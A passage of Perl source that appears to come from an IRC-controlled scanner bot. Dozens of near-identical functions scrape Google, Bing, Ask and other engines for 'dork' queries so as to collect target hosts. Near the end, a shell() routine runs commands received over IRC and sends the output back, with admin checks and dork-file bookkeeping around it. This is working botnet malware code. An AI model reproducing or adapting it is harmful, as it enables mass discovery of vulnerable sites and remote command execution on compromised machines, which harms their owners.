        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleGR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleJP() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.jp/search?q=".uri_escape($key)."&hl=&cr=countryJP&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleJP/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cn/search?q=".uri_escape($key)."&hl=&cr=countryCN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleMY() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.my/search?q=".uri_escape($key)."&hl=&cr=countryMY&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMY/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.th/search?q=".uri_escape($key)."&hl=&cr=countryTH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.in/search?q=".uri_escape($key)."&hl=&cr=countryIN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleKR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.kr/search?q=".uri_escape($key)."&hl=&cr=countryKR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleKR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleRO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ro/search?q=".uri_escape($key)."&hl=&cr=countryRO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTW() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tw/search?q=".uri_escape($key)."&hl=&cr=countryTW&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTW/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleZA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.za/search?q=".uri_escape($key)."&hl=&cr=countryZA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleZA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pt/search?q=".uri_escape($key)."&hl=&cr=countryPT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
	my @list;
	my $key = $_[0];
	for (my $i=1; $i<=1000; $i+=100) {
		my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
		my $res = &search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
			if ($link !~ /ask\.com/){
				my @grep = &links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub askCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ca.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askCA\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://de.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askIT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askUK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://fr.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askFR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://es.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askES\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ru.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askRU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://nl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askPL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://pl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askPL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askAT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://at.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://se.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askSE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://dk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://no.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNO\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://au.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://br.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askBR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://mx.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askMX\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://jp.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askJP\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() {
	my @list;
	my $key = $_[0];
	my $b   = 0;
	for ($b=1; $b<=400; $b+=10) {
		my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));
		my $res = &search_engine_query($search);
		while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {
			my $link = $1;
			if ($link !~ /onet|webcache|query/){
				my @grep = &links($link);
                push(@list,@grep);
			}
		}
	}
	return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=200; $b+=10) {
        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");
        my $res = &search_engine_query($search);
		if ($res !~ /next/) {$b=100;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /yippy\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=400; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
			my $link = $1;
            if ($link !~ /google/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=de&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=uk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingUK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ca&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCA/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=br&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=fr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingFR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=es&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingES/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=it&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingIT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingBE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=be&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingPT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=pt&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingPT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=no&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNO/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=dk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=se&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingSE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingCH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ch&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCH/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nz&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNZ/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ru&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingRU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingJP/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCN/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingKR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingMX/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query() {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 3; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub read_dorks() {
	my $dork = uri_escape($_[0]);
	my $file = "dorks.txt";
	my $success = 0;
	open (file,"<$file");
	while (my $dorkx=<file>) {
		chop($dorkx);
		if ($dorkx =~ /$dork/){
		$success = 1;
		}
	}
	close file;
	return $success;
}

sub write_dorks() {
	my $dorks = uri_escape($_[0]);
	my $file = "dorks.txt";
	open (filex,">>$file");
	print filex $dorks."\n";
	close filex;
}